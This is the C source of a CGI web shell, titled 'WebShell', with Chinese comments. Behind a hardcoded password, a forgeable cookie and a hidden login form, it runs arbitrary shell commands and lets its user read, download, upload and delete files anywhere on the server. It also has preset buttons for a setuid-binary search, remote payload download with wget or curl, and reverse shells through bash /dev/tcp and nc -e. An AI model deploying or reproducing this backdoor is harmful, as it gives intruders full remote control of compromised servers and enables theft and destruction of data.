#define PASSWORD    "admin123"
#define MAX_BUF     16384
#define MAX_PATH    4096
#define MAX_FILENAME 512

// 终极路径规范化（100%跨机器兼容，处理所有路径异常）
void safe_path(char *path) {
    if (!path || strlen(path) == 0) {
        strcpy(path, "/");
        return;
    }

    char tmp[MAX_PATH] = {0};
    char res[MAX_PATH] = {0};
    char *parts[512] = {0};
    int part_cnt = 0, i = 0;

    for (i = 0; path[i] && i < MAX_PATH-1; i++) {
        if (path[i] == '\\') tmp[i] = '/';
        else if (path[i] == '/' && i > 0 && tmp[strlen(tmp)-1] == '/') continue;
        else tmp[i] = path[i];
    }

    char *token = strtok(tmp, "/");
    while (token) {
        if (!strcmp(token, ".")) { token = strtok(NULL, "/"); continue; }
        if (!strcmp(token, "..")) { if (part_cnt > 0) part_cnt--; }
        else parts[part_cnt++] = token;
        token = strtok(NULL, "/");
    }

    strcat(res, "/");
    for (i = 0; i < part_cnt; i++) {
        strcat(res, parts[i]);
        if (i < part_cnt-1) strcat(res, "/");
    }
    strncpy(path, res, MAX_PATH-1);
}

// URL解码（全浏览器兼容）
void url_decode(char *str) {
    char *p = str;
    while (*str && p - str < MAX_PATH-1) {
        if (*str == '%' && isxdigit(*(str+1)) && isxdigit(*(str+2))) {
            char hex[3] = {*(str+1), *(str+2), '\0'};
            *p = (char)strtol(hex, NULL, 16);
            str += 3;
        } else if (*str == '+') { *p = ' '; str++; }
        else { *p = *str; str++; }
        p++;
    }
    *p = '\0';
}

// JS转义（全浏览器兼容）
void escape_js_string(char *src, char *dest) {
    int i = 0, j = 0;
    while (src[i] && j < MAX_PATH-2) {
        switch(src[i]) {
            case '"': case '\'': case '\\': case '/': case ' ':
                dest[j++] = '\\'; dest[j++] = src[i]; break;
            default: dest[j++] = src[i];
        }
        i++;
    }
    dest[j] = '\0';
}

// 命令执行（错误提示+跨机器兼容）
void exec_cmd(const char *cmd) {
    if (!cmd || strlen(cmd) == 0) return;
    char full_cmd[MAX_BUF];
    snprintf(full_cmd, sizeof(full_cmd), "%s 2>/dev/null", cmd);
    FILE *fp = popen(full_cmd, "r");
    if (!fp) { printf("<pre style='color:red'>❌ Command error: %s</pre>", strerror(errno)); return; }

    char buf[MAX_BUF];
    printf("<pre>[CMD] %s\n", cmd);
    while (fgets(buf, sizeof(buf), fp)) fputs(buf, stdout);
    printf("</pre>");
    pclose(fp);
}

// 文件读取（安全+错误提示）
void read_file_escape(const char *path) {
    if (strlen(path) == 0) return;
    FILE *fp = fopen(path, "r");
    if (!fp) { printf("<pre style='color:red'>❌ Read failed: %s</pre>", strerror(errno)); return; }
    char buf[MAX_BUF];
    printf("<pre>");
    while (fgets(buf, sizeof(buf), fp)) {
        for (int i=0; buf[i]; i++) {
            if (buf[i] == '&') printf("&amp;");
            else if (buf[i] == '<') printf("&lt;");
            else if (buf[i] == '>') printf("&gt;");
            else putchar(buf[i]);
        }
    }
    printf("</pre>");
    fclose(fp);
}

// Cookie验证（安全）
int check_cookie() {
    char *cookie = getenv("HTTP_COOKIE");
    return (cookie && strstr(cookie, "auth=ok")) ? 1 : 0;
}

// 登录页（全浏览器兼容）
void login_page() {
    printf("Content-Type: text/html; charset=utf-8\r\n\r\n");
    printf("<html><head><meta charset=\"utf-8\"><title>Login</title></head>");
    printf("<body style=\"margin:0;padding:0;\">");
    printf("<form method=\"post\" autocomplete=\"off\"><input type=\"password\" name=\"pwd\" hidden autofocus></form>");
    printf("</body></html>");
}

// 父目录计算（安全）
void get_parent_dir(char *current, char *parent) {
    strncpy(parent, current, MAX_PATH-1);
    safe_path(parent);
    char *last = strrchr(parent, '/');
    if (last && last > parent) *last = '\0';
    else strcpy(parent, "/");
    safe_path(parent);
}

// 文件下载（全浏览器兼容）
void download_file(const char *path) {
    if (strlen(path) == 0) {
        printf("Content-Type: text/html\r\n\r\n<pre>Empty path</pre>");
        exit(0);
    }
    struct stat st;
    if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) {
        printf("Content-Type: text/html\r\n\r\n<pre style='color:red'>❌ Download failed: %s</pre>", strerror(errno));
        exit(0);
    }

    char fname[MAX_FILENAME] = {0};
    char *p = strrchr(path, '/');
    strncpy(fname, p ? p+1 : path, MAX_FILENAME-1);

    printf("Content-Type: application/octet-stream\r\n");
    printf("Content-Disposition: attachment; filename*=UTF-8''%s\r\n\r\n", fname);
    FILE *fp = fopen(path, "rb");
    char buf[MAX_BUF];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) fwrite(buf, 1, n, stdout);
    fclose(fp);
    exit(0);
}

// 清理浏览器上传的全路径文件名（IE/Edge/Chrome兼容）
void clean_filename(char *fn) {
    char *p = strrchr(fn, '\\');
    if (p) memmove(fn, p+1, strlen(p+1)+1);
    p = strrchr(fn, '/');
    if (p) memmove(fn, p+1, strlen(p+1)+1);
}

// 终极上传解析（全浏览器/全机器兼容）
void handle_upload(const char *content_type, char *buf, const char *savepath) {
    if (!content_type || !strstr(content_type, "multipart/form-data")) return;

    char boundary[MAX_BUF] = {0};
    if (strstr(content_type, "boundary=\"")) sscanf(content_type, "boundary=\"%[^\"]\"", boundary);
    else sscanf(content_type, "boundary=%s", boundary);
    if (!strlen(boundary)) return;

    char full_bound[MAX_BUF] = {0};
    snprintf(full_bound, sizeof(full_bound), "--%s", boundary);

    char *fn_start = strstr(buf, "filename=\"");
    if (!fn_start) return;
    fn_start += 10;
    char *fn_end = strchr(fn_start, '"');
    if (!fn_end) return;
    *fn_end = '\0';
    clean_filename(fn_start);

    char *data_start = strstr(fn_end+1, "\r\n\r\n");
    if (!data_start) return;
    data_start += 4;
    char *data_end = strstr(data_start, full_bound);
    if (!data_end) data_end = strstr(data_start, boundary);
    if (!data_end) return;
    data_end -= 4;

    char safe_save[MAX_PATH] = {0};
    strncpy(safe_save, savepath, MAX_PATH-1);
    safe_path(safe_save);
    int len = strlen(safe_save);
    if (len > 0 && safe_save[len-1] != '/') strcat(safe_save, "/");

    struct stat st;
    if (stat(safe_save, &st) || !S_ISDIR(st.st_mode)) mkdir(safe_save, 0777);

    char full_path[MAX_PATH] = {0};
    snprintf(full_path, sizeof(full_path), "%s%s", safe_save, fn_start);
    safe_path(full_path);

    FILE *fp = fopen(full_path, "wb");
    if (!fp) {
        printf("<pre style='color:red'>❌ Upload failed: %s</pre>", strerror(errno));
        return;
    }
    fwrite(data_start, 1, data_end - data_start, fp);
    fclose(fp);
    printf("<pre style='color:green'>✅ Upload success: %s</pre>", full_path);
}

// 兼容所有Web服务器的CGI变量获取
char* get_cgi(const char *var) {
    char *v = getenv(var);
    if (v) return v;
    char http_var[128];
    snprintf(http_var, sizeof(http_var), "HTTP_%s", var);
    return getenv(http_var);
}

// 安全解析参数（不破坏上传数据，GET+POST兼容）
void parse_param(char *data, char *key, char *val, int max_len) {
    if (!data || !key || !val) return;
    char *p = strstr(data, key);
    if (!p) return;
    p += strlen(key);
    int i = 0;
    while (*p && *p != '&' && i < max_len-1) {
        val[i++] = *p++;
    }
    val[i] = '\0';
    url_decode(val);
    safe_path(val);
}

int main() {
    char buf[MAX_BUF] = {0};
    char cmd[MAX_BUF] = "", path[MAX_PATH] = "/";
    char read_target[MAX_PATH] = "", del_target[MAX_PATH] = "", dl_target[MAX_PATH] = "";
    char rhost[64] = "", rport[16] = "", url[MAX_BUF] = "";
    char savepath[MAX_PATH] = "/tmp/";
    int anchor = 0, logged = 0;

    logged = check_cookie();
    char *method = get_cgi("REQUEST_METHOD");
    char *cont_len = get_cgi("CONTENT_LENGTH");
    char *content_type = get_cgi("CONTENT_TYPE");
    char *query_str = getenv("QUERY_STRING");

    // 读取POST数据（安全兜底）
    if (method && !strcmp(method, "POST") && cont_len) {
        int len = atoi(cont_len);
        if (len > 0 && len < MAX_BUF-1) {
            fread(buf, 1, len, stdin);
            buf[len] = '\0';
        }
    }

    // 登录验证（兼容GET+POST）
    char pwd[64] = {0};
    parse_param(buf, "pwd=", pwd, 64);
    parse_param(query_str, "pwd=", pwd, 64);
    if (!strcmp(pwd, PASSWORD)) {
        logged = 1;
        printf("Set-Cookie: auth=ok; path=/; max-age=3600\r\n");
    }

    if (!logged) { login_page(); return 0; }

    // 统一解析GET+POST参数（全环境兼容）
    parse_param(buf, "cmd=", cmd, MAX_BUF);
    parse_param(query_str, "cmd=", cmd, MAX_BUF);

    parse_param(buf, "dir=", path, MAX_PATH);
    parse_param(query_str, "dir=", path, MAX_PATH);

    parse_param(buf, "read=", read_target, MAX_PATH);
    parse_param(query_str, "read=", read_target, MAX_PATH);

    parse_param(buf, "dl=", dl_target, MAX_PATH);
    parse_param(query_str, "dl=", dl_target, MAX_PATH);

    parse_param(buf, "del=", del_target, MAX_PATH);
    parse_param(query_str, "del=", del_target, MAX_PATH);

    parse_param(buf, "rhost=", rhost, 64);
    parse_param(buf, "rport=", rport, 16);
    parse_param(buf, "url=", url, MAX_BUF);
    parse_param(buf, "savepath=", savepath, MAX_PATH);

    char anch[8] = {0};
    parse_param(buf, "anchor=", anch, 8);
    anchor = atoi(anch);

    // 下载优先级最高
    if (strlen(dl_target) > 0) download_file(dl_target);

    // CGI标准响应头（所有服务器兼容）
    printf("Content-Type: text/html; charset=utf-8\r\n\r\n");
    char *anchor_tag = anchor ? "#file" : "";

    // ==================== 全兼容HTML页面 ====================
    printf("<html><head><meta charset=\"utf-8\"><title>WebShell</title>");
    printf("<style>body{background:#2b2b2b;color:#dcdcdc;font-family:monospace;margin:15px}");
    printf("fieldset{margin:10px 0;padding:10px;border:1px solid #0f0}");
    printf("legend{color:#0f0}input{margin:2px;padding:4px}pre{background:#333;padding:8px;overflow-x:auto}");
    printf(".dir-link{color:#0f0;cursor:pointer}.file-text{color:#fff}</style></head><body>");
    printf("<h2 style='color:#0f0'>WebShell</h2>");

    // 命令执行
    printf("<fieldset><legend>Command</legend>");
    printf("<form method='post' autocomplete='off'>Command: <input type='text' name='cmd' size=70><input type='submit' value='Run'></form>");
    exec_cmd(cmd);
    printf("</fieldset>");

    // 快捷工具
    printf("<fieldset><legend>Tools</legend>");
    printf("<form method='post'><input type='submit' name='cmd' value='ss -tulwn'> ");
    printf("<input type='submit' name='cmd' value='find / -perm -4000'> ");
    printf("<input type='submit' name='cmd' value='id'></form></fieldset>");

    // 文件上传
    printf("<fieldset><legend>Upload</legend>");
    printf("<form method='post' enctype='multipart/form-data' autocomplete='off'>");
    printf("Path: <input name='savepath' value='%s' size=30> File: <input type='file' name='upload'>", savepath);
    printf("<input type='submit' value='Upload'></form>");
    handle_upload(content_type, buf, savepath);
    printf("</fieldset>");

    // 远程下载
    printf("<fieldset><legend>Remote Download</legend>");
    printf("<form method='post' autocomplete='off'>URL: <input name='url' size=50> Path: <input name='savepath' value='%s' size=20><br>", savepath);
    printf("<input type='submit' name='cmd' value='wget $url -P $savepath'> ");
    printf("<input type='submit' name='cmd' value='curl -L $url -o $savepath/$(basename $url)'></form></fieldset>");

    // 反向Shell（修复语法错误，跨机器兼容）
    printf("<fieldset><legend>Reverse Shell</legend>");
    printf("<form method='post' autocomplete='off'>LHOST: <input name='rhost' size=18> LPORT: <input name='rport' size=8><br>");
    printf("<input type='submit' name='cmd' value='bash -i >& /dev/tcp/$rhost/$rport 0>&1 &'> ");
    printf("<input type='submit' name='cmd' value='nc -e /bin/sh $rhost $rport &'></form></fieldset>");

    // 文件管理器
    printf("<fieldset id='file'><legend>File Manager</legend>");
    printf("<div>Path: <b>%s</b></div>", path);

    printf("<form method='post' action='%s' autocomplete='off'>", anchor_tag);
    printf("<input type='hidden' name='anchor' value='1'>");
    printf("<input name='dir' value='%s' size=30><input type='submit' value='Browse'></form>", path);

    printf("<form method='post' action='%s' autocomplete='off'>", anchor_tag);
    printf("Read: <input name='read' size=20> DL: <input name='dl' size=20> Del: <input name='del' size=15>");
    printf("<input type='submit' value='GO'></form>");

    read_file_escape(read_target);

    // 目录浏览（错误提示+全兼容）
    DIR *dir = opendir(path);
    if (dir) {
        char parent[MAX_PATH], esc_parent[MAX_PATH];
        get_parent_dir(path, parent);
        escape_js_string(parent, esc_parent);
        printf("<span class='dir-link' onclick=\"document.getElementsByName('dir')[0].value='%s';this.form.submit()\">../</span><br>", parent);

        struct dirent *ent;
        while ((ent = readdir(dir))) {
            if (!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")) continue;
            char full[MAX_PATH], esc_full[MAX_PATH];
            snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);
            safe_path(full);
            escape_js_string(full, esc_full);

            struct stat st;
            if (stat(full, &st) == 0 && S_ISDIR(st.st_mode)) {
                printf("<span class='dir-link' onclick=\"document.getElementsByName('dir')[0].value='%s';this.form.submit()\">%s/</span><br>", full, ent->d_name);
            } else {
                printf("<span class='file-text'>%s</span><br>", ent->d_name);
            }
        }
        closedir(dir);
    } else {
        printf("<pre style='color:red'>❌ Open dir failed: %s</pre>", strerror(errno));
    }

    // 文件删除
    if (strlen(del_target) > 0) {
        if (!remove(del_target)) printf("<pre style='color:green'>✅ Deleted: %s</pre>", del_target);
        else printf("<pre style='color:red'>❌ Delete failed: %s</pre>", strerror(errno));
    }

    // 极简JS（全浏览器兼容，无崩溃）
    printf("<script>function clearHash(){location.hash='';}</script>");
    printf("</fieldset></body></html>");
    return 0;
}
